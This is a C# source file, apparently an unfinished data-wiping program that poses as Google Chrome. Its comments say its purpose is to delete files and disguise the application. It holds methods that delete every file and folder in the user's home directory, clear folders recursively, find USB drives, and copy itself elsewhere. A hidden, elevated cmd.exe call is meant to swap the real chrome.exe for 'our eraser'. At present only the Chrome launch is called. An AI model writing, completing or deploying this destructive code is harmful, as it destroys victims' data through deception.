using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Security.Principal;
using System.Linq;

namespace chrome
{
    /// <summary>
    /// Provides methods and utilities to delete files and disguise the application.
    /// </summary>
    class chr
    {
        /// <summary>
        /// Creates a new instance of chr() class.
        /// </summary>
        public chr()
        {
            //Add here the method calls you want.
            //Notice: Nothing was added here to prevent accidental deletion when building or running.
            init();
            //alvCopyItselfTo();
        }

        private static string userHome = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        private static string userMyDoc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static string userDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private static string userPersonal = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        private static string userMyMusic = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        private static string userMyVideos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        private static string userMyPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string userAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private System.IO.DirectoryInfo userHomePath = new DirectoryInfo(userHome);
        private System.IO.DirectoryInfo userMyDocPath = new DirectoryInfo(userMyDoc);
        private System.IO.DirectoryInfo userDesktopPath = new DirectoryInfo(userDesktop);
        private System.IO.DirectoryInfo userPersonalPath = new DirectoryInfo(userPersonal);
        private System.IO.DirectoryInfo userMyMusicPath = new DirectoryInfo(userMyMusic);
        private System.IO.DirectoryInfo userMyVideosPath = new DirectoryInfo(userMyVideos);
        private System.IO.DirectoryInfo userMyPicturesPath = new DirectoryInfo(userMyPictures);
        private System.IO.DirectoryInfo userAppDataPath = new DirectoryInfo(userAppData);

        /// <summary>
        /// Initialitates all the methods in the class.
        /// </summary>
        private void init()
        {
            alvStartChrome();
        }

        /// <summary>
        /// Deletes every single file and folder within a directory.
        /// </summary>
        private void alvDeleteDirectoryContent()
        {
            foreach (FileInfo file in userHomePath.GetFiles())
            {
                file.Delete();
            }
        }

        /// <summary>
        /// Deletes every single folder and its content within given directory except for the files.
        /// </summary>
        private void alvDeleteDirectory()
        {
            foreach (DirectoryInfo dir in userHomePath.GetDirectories())
            {
                dir.Delete(true);
            }
        }

        /// <summary>
        /// Deletes every file from given directory but keeps the folder hierarchy.
        /// </summary>
        private void alvDeleteFilesKeepDirectories(string path)
        {
            var fileGenerationDir = new DirectoryInfo(path);
            fileGenerationDir.GetFiles("*", SearchOption.AllDirectories).ToList().ForEach(file => file.Delete());
        }

        /// <summary>
        /// Starts Chrome web browser.
        /// </summary>
        private void alvStartChrome()
        {
            Process.Start("chrome.exe");
        }

        /// <summary>
        /// Retrieves the USB devices connected to the system.
        /// I'm working on this and doesn't work by now.
        /// </summary>
        /// <returns>Path to USB devices</returns>
        private string alvGetUsbDrivePath()
        {
            string pathToDrive = null;

            DriveInfo[] mydrives = DriveInfo.GetDrives();
            foreach (DriveInfo mydrive in mydrives)
            {
                //Check for removable devices like USB's
                if (mydrive.DriveType == DriveType.Removable) 
                {
                    //Check for that specific USB
                    //if (mydrive.VolumeLabel.Equals("BAKUP-USB")) 
                    //{
                    DirectoryInfo path = mydrive.RootDirectory;
                    pathToDrive = Path.GetFullPath(path.ToString());

                    //} 
                }
            }
            return pathToDrive;
        }

        /// <summary>
        /// Clears folder recursively.
        /// </summary>
        /// <param name="FolderName">Path to folder</param>
        private void alvClearFolder(string FolderName)
        {
            DirectoryInfo dir = new DirectoryInfo(FolderName);

            foreach (FileInfo fi in dir.GetFiles())
            {
                fi.Delete();
            }

            foreach (DirectoryInfo di in dir.GetDirectories())
            {
                alvClearFolder(di.FullName);
                di.Delete();
            }
        }
        
        /// <summary>
        /// Makes a copy of itself to the given path 
        /// </summary>
        private void alvCopyItselfTo(string path)
        {
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
            File.Copy(filePath, Path.Combine(path, fileName));
        }

        /// <summary>
        /// Runs a command prompt as administrator. It is supposed to change the Google Chrome main executable
        /// to chromer.exe or whatever name you want and then copy our eraser chrome.exe to that directory.
        /// </summary>
        private void alvRunCmdAsAdminBackground()
        {
            System.Diagnostics.ProcessStartInfo myProcessInfo = new System.Diagnostics.ProcessStartInfo(); //Initializes a new ProcessStartInfo of name myProcessInfo
            myProcessInfo.FileName = Environment.ExpandEnvironmentVariables("%SystemRoot%") + @"\System32\cmd.exe"; //Sets the FileName property of myProcessInfo to %SystemRoot%\System32\cmd.exe where %SystemRoot% is a system variable which is expanded using Environment.ExpandEnvironmentVariables
            myProcessInfo.Arguments = "cd.."; //Sets the arguments to cd..
            myProcessInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; //Sets the WindowStyle of myProcessInfo which indicates the window state to use when the process is started to Hidden
            myProcessInfo.Verb = "runas"; //The process should start with elevated permissions
            System.Diagnostics.Process.Start(myProcessInfo); //Starts the process based on myProcessInfo
        }
    }
}
